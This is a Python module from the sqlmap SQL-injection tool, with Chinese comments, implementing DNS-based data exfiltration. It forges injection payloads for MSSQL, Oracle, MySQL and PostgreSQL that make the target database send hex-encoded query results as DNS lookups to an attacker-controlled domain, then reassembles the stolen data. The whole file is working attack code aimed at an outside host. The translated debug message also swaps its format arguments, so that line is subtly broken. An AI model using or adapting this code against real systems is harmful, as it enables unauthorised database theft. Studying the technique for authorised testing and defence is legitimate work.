#!/usr/bin/env python
#coding=utf-8
"""
Copyright (c) 2006-2017 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import re
import time

from extra.safe2bin.safe2bin import safecharencode
from lib.core.agent import agent
from lib.core.common import Backend
from lib.core.common import calculateDeltaSeconds
from lib.core.common import dataToStdout
from lib.core.common import decodeHexValue
from lib.core.common import extractRegexResult
from lib.core.common import getSQLSnippet
from lib.core.common import hashDBRetrieve
from lib.core.common import hashDBWrite
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import safeStringFormat
from lib.core.common import singleTimeWarnMessage
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.data import queries
from lib.core.enums import DBMS
from lib.core.settings import DNS_BOUNDARIES_ALPHABET
from lib.core.settings import MAX_DNS_LABEL
from lib.core.settings import PARTIAL_VALUE_MARKER
from lib.core.unescaper import unescaper
from lib.request.connect import Connect as Request


def dnsUse(payload, expression):
    """
    通过向攻击者的机器发出请求，获取利用DNS解析机制的SQL查询的输出.
    """

    start = time.time()

    retVal = None
    count = 0
    offset = 1

    if conf.dnsDomain and Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL):
        output = hashDBRetrieve(expression, checkConf=True)

        if output and PARTIAL_VALUE_MARKER in output or kb.dnsTest is None:
            output = None

        if output is None:
            kb.dnsMode = True

            while True:
                count += 1
                # 用于DNS技术中名称解析请求的前缀和后缀字符串的字母（不包括不与内容混合的十六进制字符）
                # DNS_BOUNDARIES_ALPHABET = re.sub("[a-fA-F]", "", string.ascii_letters)
                prefix, suffix = ("%s" % randomStr(length=3, alphabet=DNS_BOUNDARIES_ALPHABET) for _ in xrange(2))
                # MAX_DNS_LABEL = 63
                chunk_length = MAX_DNS_LABEL / 2 if Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.MYSQL, DBMS.PGSQL) else MAX_DNS_LABEL / 4 - 2
                _, _, _, _, _, _, fieldToCastStr, _ = agent.getFields(expression)
                nulledCastedField = agent.nullAndCastField(fieldToCastStr)
                extendedField = re.search(r"[^ ,]*%s[^ ,]*" % re.escape(fieldToCastStr), expression).group(0)
                if extendedField != fieldToCastStr:  # e.g. MIN(surname)
                    nulledCastedField = extendedField.replace(fieldToCastStr, nulledCastedField)
                    fieldToCastStr = extendedField
                nulledCastedField = queries[Backend.getIdentifiedDbms()].substring.query % (nulledCastedField, offset, chunk_length)
                nulledCastedField = agent.hexConvertField(nulledCastedField)
                expressionReplaced = expression.replace(fieldToCastStr, nulledCastedField, 1)

                expressionRequest = getSQLSnippet(Backend.getIdentifiedDbms(), "dns_request", PREFIX=prefix, QUERY=expressionReplaced, SUFFIX=suffix, DOMAIN=conf.dnsDomain)
                expressionUnescaped = unescaper.escape(expressionRequest)

                if Backend.getIdentifiedDbms() in (DBMS.MSSQL, DBMS.PGSQL):
                    query = agent.prefixQuery("; %s" % expressionUnescaped)
                    query = "%s%s" % (query, queries[Backend.getIdentifiedDbms()].comment.query)
                    forgedPayload = agent.payload(newValue=query)
                else:
                    forgedPayload = safeStringFormat(payload, (expressionUnescaped, randomInt(1), randomInt(3)))

                Request.queryPage(forgedPayload, content=False, noteResponseTime=False, raise404=False)

                _ = conf.dnsServer.pop(prefix, suffix)

                if _:
                    _ = extractRegexResult("%s\.(?P<result>.+)\.%s" % (prefix, suffix), _, re.I)
                    _ = decodeHexValue(_)
                    output = (output or "") + _
                    offset += len(_)

                    if len(_) < chunk_length:
                        break
                else:
                    break

            output = decodeHexValue(output) if conf.hexConvert else output

            kb.dnsMode = False

        if output is not None:
            retVal = output

            if kb.dnsTest is not None:
                dataToStdout("[%s] [INFO] %s: %s\n" % (time.strftime("%X"), "retrieved" if count > 0 else "resumed", safecharencode(output)))

                if count > 0:
                    hashDBWrite(expression, output)

        if not kb.bruteMode:
            debugMsg = u"在%.2f秒内执行了%d个查询" % (count, calculateDeltaSeconds(start))
            logger.debug(debugMsg)

    elif conf.dnsDomain:
        warnMsg = "通过SQL注入DNS数据这种渗透方法"
        warnMsg += "目前不适用于DBMS %s" % Backend.getIdentifiedDbms()
        singleTimeWarnMessage(warnMsg)

    return safecharencode(retVal) if kb.safeCharEncode else retVal
